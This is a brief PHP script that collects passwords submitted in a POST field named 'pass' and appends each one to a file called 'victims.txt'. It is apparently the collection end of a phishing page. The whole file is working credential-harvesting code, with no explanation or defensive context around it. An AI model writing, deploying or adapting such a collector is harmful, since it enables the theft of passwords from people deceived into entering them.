<?php
$p = $_POST['pass'];
if ($p){
    $f = fopen('victims.txt','a+');
    fwrite($f,'PASSWORD : '.$p."\n");
    fclose($f);
}
?>